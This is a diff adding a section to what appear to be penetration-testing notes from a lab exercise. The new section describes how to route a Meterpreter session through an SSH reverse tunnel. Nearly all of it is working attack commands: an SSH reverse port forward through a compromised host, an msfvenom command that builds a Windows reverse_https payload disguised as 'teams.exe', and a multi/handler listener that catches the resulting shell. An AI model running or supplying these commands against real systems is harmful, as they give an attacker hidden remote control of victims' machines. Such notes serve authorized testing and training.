@@ -26,3 +26,20 @@ ssh -D 4444 target@10.10.10.10
 
 This will open port 4444 on our localhost and then send traffic through that port to and from the target host at IP 10.10.10.10
 
+## Port forward Meterpreter Session Through SSH
+
+```bash
+ssh -i rootssh -R 172.16.8.120:4445:10.10.14.5:5555 root@10.129.229.147 -vN
+```
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_https -f exe -o teams.exe LHOST=172.16.8.120 LPORT=4445
+```
+
+```msfconsole
+use multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set lhost 10.10.14.5
+set lport 5555
+run -j
+```
